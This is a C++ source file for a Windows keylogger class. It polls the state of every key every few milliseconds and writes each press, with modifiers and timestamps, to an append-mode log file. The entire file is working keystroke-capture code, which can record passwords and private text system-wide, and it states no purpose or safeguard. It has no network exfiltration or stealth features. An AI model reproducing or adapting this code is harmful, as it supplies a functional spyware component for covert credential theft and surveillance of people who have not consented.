#include "keylog.h"
#include <stdexcept>
#include <map>

KeyLogger::KeyLogger(const std::string& filePath) : running(false), filePath(filePath) {
    if (!openLogFile()) {
        throw std::runtime_error("Failed to initialize log file: " + filePath);
    }
}

KeyLogger::~KeyLogger() {
    StopLogging();
    if (logFile) {
        fclose(logFile);
        logFile = nullptr;
    }
}

bool KeyLogger::openLogFile() {
    if (logFile) {
        fclose(logFile);
    }
    logFile = fopen(filePath.c_str(), "a"); // Append mode to preserve logs
    if (!logFile) {
        spdlog::error("Failed to open log file: {}", filePath);
        return false;
    }
    spdlog::info("Logging to file: {}", filePath);
    return true;
}

std::string KeyLogger::GetKeyName(int vkCode, bool shiftPressed, bool capsLock) {
    char keyName[32];
    UINT scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);
    
    if (GetKeyNameText(scanCode << 16, keyName, sizeof(keyName)) > 0) {
        return std::string(keyName);
    }

    static const std::map<int, std::pair<std::string, std::string>> specialKeys = {
        {VK_SPACE, {" ", " "}}, {VK_RETURN, {"[ENTER]", "[ENTER]"}},
        {VK_TAB, {"[TAB]", "[TAB]"}}, {VK_BACK, {"[BACKSPACE]", "[BACKSPACE]"}},
        {VK_ESCAPE, {"[ESC]", "[ESC]"}}, {VK_LEFT, {"[LEFT]", "[LEFT]"}},
        {VK_RIGHT, {"[RIGHT]", "[RIGHT]"}}, {VK_UP, {"[UP]", "[UP]"}},
        {VK_DOWN, {"[DOWN]", "[DOWN]"}},
        {VK_OEM_1, {";", ":"}}, {VK_OEM_2, {"/", "?"}}, {VK_OEM_3, {"`", "~"}},
        {VK_OEM_4, {"[", "{"}}, {VK_OEM_5, {"\\", "|"}}, {VK_OEM_6, {"]", "}"}},
        {VK_OEM_7, {"'", "\""}}, {VK_OEM_PLUS, {"=", "+"}}, {VK_OEM_MINUS, {"-", "_"}},
        {VK_OEM_COMMA, {",", "<"}}, {VK_OEM_PERIOD, {".", ">"}},
    };

    if (specialKeys.count(vkCode)) {
        return shiftPressed ? specialKeys.at(vkCode).second : specialKeys.at(vkCode).first;
    }

    BYTE keyboardState[256];
    GetKeyboardState(keyboardState);
    WCHAR buffer[2];
    if (ToUnicode(vkCode, scanCode, keyboardState, buffer, 2, 0) == 1) {
        return std::string(1, (char)buffer[0]);
    }

    return "[VK_" + std::to_string(vkCode) + "]";
}

KeyLogger::KeyboardState KeyLogger::getKeyboardState() const {
    return {
        (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0,
        (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0,
        (GetAsyncKeyState(VK_MENU) & 0x8000) != 0,
        (GetKeyState(VK_CAPITAL) & 0x0001) != 0
    };
}

std::string KeyLogger::formatLogEntry(int vkCode, const std::string& keyName,
                                     const KeyboardState& state,
                                     const std::chrono::system_clock::time_point& startTime) {
    // Get modifiers
    std::string modifiers;
    if (state.ctrlPressed) modifiers += "CTRL+";
    if (state.altPressed) modifiers += "ALT+";
    if (state.shiftPressed) modifiers += "SHIFT+";
    if (modifiers.empty()) {
        modifiers = "None";
    } else {
        // Remove the last '+' if there are modifiers
        modifiers = modifiers.substr(0, modifiers.length() - 1);
    }

    // Calculate timestamp
    auto timestamp = std::chrono::duration_cast<std::chrono::milliseconds>(
        std::chrono::system_clock::now() - startTime).count();

    spdlog::info("Key Pressed: {} | Modifiers: {} | Timestamp: {}ms", keyName, modifiers, timestamp);

    // Format the log entry
    return "Key Pressed: " + keyName + " | Modifiers: " + modifiers + 
           " | Timestamp: " + std::to_string(timestamp) + "ms\n";
}

void KeyLogger::processKeyPress(int vkCode, const KeyboardState& state, char* buffer,
                               size_t& bufferPos, const std::chrono::system_clock::time_point& startTime) {
    std::string keyName = GetKeyName(vkCode, state.shiftPressed, state.capsLock);
    std::string entry = formatLogEntry(vkCode, keyName, state, startTime);
    
    // spdlog::info("{}", entry);
    
    std::lock_guard<std::mutex> lock(logMutex);
    size_t remaining = BUFFER_SIZE - bufferPos;
    size_t entrySize = entry.length();
    
    if (entrySize >= remaining) {
        flushBuffer(buffer, bufferPos);
    }
    
    memcpy(buffer + bufferPos, entry.c_str(), entrySize);
    bufferPos += entrySize;
}

void KeyLogger::flushBuffer(char* buffer, size_t& bufferPos) {
    if (logFile && bufferPos > 0) {
        fwrite(buffer, 1, bufferPos, logFile);
        fflush(logFile);
        bufferPos = 0;
    }
}

void KeyLogger::StartLogging() {
    if (running) return;
    running = true;

    loggingThread = std::thread([this]() {
        SHORT lastState[256] = {0};
        auto startTime = std::chrono::system_clock::now();
        char buffer[BUFFER_SIZE];
        size_t bufferPos = 0;

        while (running) {
            KeyboardState state = getKeyboardState();
            
            for (int vkCode = 0x01; vkCode <= 0xFE; vkCode++) {
                SHORT currentState = GetAsyncKeyState(vkCode);
                if ((currentState & 0x8000) && !(lastState[vkCode] & 0x8000)) {
                    processKeyPress(vkCode, state, buffer, bufferPos, startTime);
                }
                lastState[vkCode] = currentState;
            }
            
            if (bufferPos > BUFFER_SIZE * 0.8) {
                flushBuffer(buffer, bufferPos);
            }
            std::this_thread::sleep_for(std::chrono::milliseconds(5));
        }
        
        flushBuffer(buffer, bufferPos); // Final flush
    });
}

void KeyLogger::StopLogging() {
    running = false;
    if (loggingThread.joinable()) {
        loggingThread.join();
    }
}